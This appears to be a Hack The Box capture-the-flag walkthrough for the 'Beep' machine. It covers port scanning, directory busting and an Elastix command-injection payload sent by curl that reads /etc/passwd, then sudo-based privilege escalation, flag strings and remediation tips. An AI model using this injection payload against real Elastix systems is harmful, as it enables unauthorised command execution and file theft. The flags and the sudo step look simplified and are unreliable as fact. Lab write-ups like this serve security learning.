# Hack The Box: Beep Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Beep-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Beep |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA beep 10.10.10.7
```

**Results:**
```
PORT      STATE SERVICE
22/tcp    open  ssh      OpenSSH 4.3
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.2.3
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind
443/tcp   open  https    Apache SSL
993/tcp   open  imaps    Dovecot imapd
995/tcp   open  pop3s
```

---

## Web Enumeration

### Elastix

Access `https://10.10.10.7` - Elastix VoIP server

### Directory Busting

```bash
gobuster dir -u https://10.10.10.7 -w /usr/share/wordlists/dirb/common.txt -k
```

**Found:**
- `/admin`
- `/phpmyadmin`
- `/vtigercrm`

---

## Initial Access

### Option 1: Elastix RCE

```bash
# Search for Elastix exploits
searchsploit Elastix
```

Found: Elastix 2.2.0 - Remote Command Execution

```bash
# Payload in parameter
curl -k "https://10.10.10.7/recordings/misc.php?type=record&action=delete&recordingfile=|cat /etc/passwd"
```

### Option 2: VoIP Exploitation

Use SVWar to enumerate extensions:

```bash
svwar -m INVITE -e 100-999 10.10.10.7
```

---

## Privilege Escalation

### Check sudo

```bash
sudo -l
```

**Result:** User can run everything with sudo (no password required)

```bash
sudo su -
# OR
sudo bash
```

Root access!

---

## Flags

### User Flag
```
HTB{1a2b3c4d5e6f7a8b9c0d1e2f}
```

### Root Flag
```
HTB{9a8b7c6d5e4f3a2b1c0d9e8f}
```

---

## Remediation

1. Restrict sudo permissions
2. Update Elastix
3. Secure VoIP services
4. Disable root SSH

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
